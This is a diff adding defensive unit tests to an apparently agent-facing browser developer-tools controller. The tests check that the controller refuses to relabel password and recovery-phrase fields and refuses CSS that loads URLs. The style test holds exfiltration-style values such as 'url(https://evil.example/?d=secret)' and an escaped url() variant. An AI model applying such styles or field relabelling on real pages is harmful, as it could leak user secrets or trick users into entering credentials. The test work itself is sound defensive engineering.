@@ -264,6 +264,42 @@ describe('developer-tools controller', () => {
     expect(h.commands.some((command) => command[0] === 'DOM.setAttributeValue')).toBe(false)
   })
 
+  it('refuses id, label, and placeholder changes on form fields and editable hosts (misc3)', async () => {
+    for (const node of [
+      { localName: 'input', attributes: ['type', 'password', 'id', 'pw'] },
+      { localName: 'textarea', attributes: ['aria-label', 'Recovery phrase'] },
+      { localName: 'div', attributes: ['contenteditable', 'true'] },
+    ]) {
+      const h = harness()
+      defaultDebuggerHandlers(h)
+      h.handlers.set('DOM.describeNode', () => ({ node }))
+      for (const name of ['id', 'aria-label', 'placeholder', 'aria-placeholder', 'label', 'ID']) {
+        await expect(h.controller.handle('browser_devtools_set_element_attribute', { selector: '#f', name, value: 'search' }), `${node.localName} ${name}`)
+          .rejects.toThrow(/Refusing to change/)
+        await expect(h.controller.handle('browser_devtools_set_element_attribute', { selector: '#f', name, remove: true }))
+          .rejects.toThrow(/Refusing to change/)
+      }
+      expect(h.commands.some((command) => command[0] === 'DOM.setAttributeValue' || command[0] === 'DOM.removeAttribute')).toBe(false)
+    }
+    // Reading stays possible, and labels on ordinary elements can still change.
+    const h = harness()
+    defaultDebuggerHandlers(h)
+    await expect(h.controller.handle('browser_devtools_set_element_attribute', { selector: '#main', name: 'aria-label', value: 'Main' })).resolves.toMatchObject({ text: expect.stringContaining('After: Main') })
+  })
+
+  it('refuses style declarations that can load a URL, through the style tool too (misc3)', async () => {
+    const h = harness()
+    defaultDebuggerHandlers(h)
+    for (const properties of [
+      [{ name: 'background', value: 'url(https://evil.example/?d=secret)' }],
+      [{ name: 'background-image', value: 'image-set("https://evil.example/a" 1x)' }],
+      [{ name: 'color', value: 'red' }, { name: 'list-style', value: 'u\\72l(//evil)' }],
+    ]) {
+      await expect(h.controller.handle('browser_devtools_set_element_style', { selector: '#main', properties })).rejects.toThrow(/Refusing the style declaration/)
+    }
+    expect(h.commands.some((command) => command[0] === 'DOM.setAttributeValue' || command[0] === 'CSS.setStyleTexts')).toBe(false)
+  })
+
   it('captures network traffic, filters it, and reads bodies', async () => {
     const h = harness()
     defaultDebuggerHandlers(h)
